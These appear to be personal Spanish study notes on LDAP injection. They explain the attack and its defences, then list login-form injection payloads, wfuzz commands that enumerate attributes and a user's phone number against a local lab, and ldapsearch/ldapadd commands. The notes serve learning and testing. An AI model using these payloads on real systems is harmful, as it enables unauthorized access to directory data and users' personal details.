-- -
Las inyecciones LDAP (Protocolo de Directorio Ligero) son un tipo de ataque en el que se aprovechan las vulnerabilidades en las aplicaciones web que interactúan con un servidor LDAP. El servidor LDAP es un directorio que se utiliza para almacenar información de usuarios y recursos en una red.

La inyección LDAP funciona mediante la inserción de comandos LDAP maliciosos en los campos de entrada de una aplicación web, que luego son enviados al servidor LDAP para su procesamiento. Si la aplicación web no está diseñada adecuadamente para manejar la entrada del usuario, un atacante puede aprovechar esta debilidad para realizar operaciones no autorizadas en el servidor LDAP.

Al igual que las inyecciones SQL y NoSQL, las inyecciones LDAP pueden ser muy peligrosas. Algunos ejemplos de lo que un atacante podría lograr mediante una inyección LDAP incluyen:

Acceder a información de usuarios o recursos que no debería tener acceso.
Realizar cambios no autorizados en la base de datos del servidor LDAP, como agregar o eliminar usuarios o recursos.
Realizar operaciones maliciosas en la red, como lanzar ataques de phishing o instalar software malicioso en los sistemas de la red.
Para evitar las inyecciones LDAP, las aplicaciones web que interactúan con un servidor LDAP deben validar y limpiar adecuadamente la entrada del usuario antes de enviarla al servidor LDAP. Esto incluye la validación de la sintaxis de los campos de entrada, la eliminación de caracteres especiales y la limitación de los comandos que pueden ser ejecutados en el servidor LDAP.

También es importante que las aplicaciones web se ejecuten con privilegios mínimos en la red y que se monitoreen regularmente las actividades del servidor LDAP para detectar posibles inyecciones.
-- -
- user_id=o*&password=\*&login=1&submit=Submit ---> Enumeracion de posibles usuarios (Si el codigo de respuesta es un 301 significa que hay un usuario que tiene esos caracteres). 
%00 ---> comantario

- wfuzz -c --hh=550 -w /usr/share/seclists/Fuzzing/LDAP-openldap-attributes.txt -d 'user_id=admin)(FUZZ=\*))%00&password=\*&login=1&submit=Submit' http://localhost:8888 ---> Fuzzeo de atributos

- wfuzz -c --hh=550 -z range,0-9 -d 'user_id=fran)(telephoneNumber=FUZZ*))%00&password=\*&login=1&submit=Submit' http://localhost:8888 ---> Enumeracion del primer numero del numero de telefono relacionado con el usuario ingresado.

- wfuzz -c --hh=550 -z range,0-9 -d 'user_id=fran)(telephoneNumber=5FUZZ*))%00&password=\*&login=1&submit=Submit' http://localhost:8888 ---> Enumeracion del segundo numero de telefono (y asi sucesivamente).

- user_id=omar)(mail=\*))%00&password=\*&login=1&submit=Submit ---> Inyeccion LDAP.
-- -
## Comandos de para interactuar con ldap.
- ldapsearch -x -H ldap://localhost -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin 'cn=admin' ---> Para saber cuales son los argumentos que tenemos que poner podemos usar scripts de nmap (sudo nmap --script ldap\* -p389 localhost).

- ldapadd -x -H ldap://localhost -D "cn=admin,dc=example,dc=org" -w admin -f newuser.ldiff ---> Agrega un usuario con los atributos especificados en el archivo.

## Aclaraciones:
- Cuidado al copiar y pegar comandos, hay varias \ para escapar algunas cosas propias de obsidian.